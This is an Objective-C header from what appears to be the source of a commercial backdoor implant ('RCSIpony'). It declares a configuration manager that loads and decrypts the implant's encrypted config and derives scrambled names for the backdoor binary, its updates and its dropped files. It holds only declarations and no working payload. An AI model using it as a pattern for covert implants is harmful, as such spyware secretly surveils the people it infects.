/*
 * RCSIpony - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSIConfigManager_h__
#define __RCSIConfigManager_h__

#import "RCSIEncryption.h"
#import "NSString+SHA1.h"
#import "RCSICommon.h"

//
// Only used if there's no other name to use
//
#define DEFAULT_CONF_NAME    @"PWR84nQ0C54WR.Y8n"

@interface RCSIConfManager : NSObject
{
@private
  // Configuration Filename derived from the scrambled backdoor name
  NSString *mConfigurationName;
  
  // Backdoor update name (backdoorName scrambleForward: ALPHABET_LEN / 2)
  NSString *mBackdoorUpdateName;
  
  // Backdoor binary name - all the dropped files are derived from this string
  NSString *mBackdoorName;
  // Configuration Data
  NSData *mConfigurationData;
  
@private
  RCSIEncryption *mEncryption;

@private
  //
  // This will hold any kind of data that can be useful to the backdoor and needs
  // to be accessed
  //
  NSData *mGlobalConfiguration;
  
@protected
  id mDelegate;
}

@property(readonly, copy) NSData *mGlobalConfiguration;
@property(readonly, copy) NSString *mBackdoorName;
@property(readonly, copy) NSString *mBackdoorUpdateName;


- (id)initWithBackdoorName: (NSString *)aName;
- (void)dealloc;

- (id)delegate;
- (void)setDelegate: (id)aDelegate;

//
// @author
//  revenge
// @abstract
//  This function will parse and fill all the required objects with the
//  configuration values.
// @return
//  FALSE if an error occurred otherwise TRUE.
//
- (BOOL)loadConfiguration;
- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile;

- (RCSIEncryption *)encryption;

@end

#endif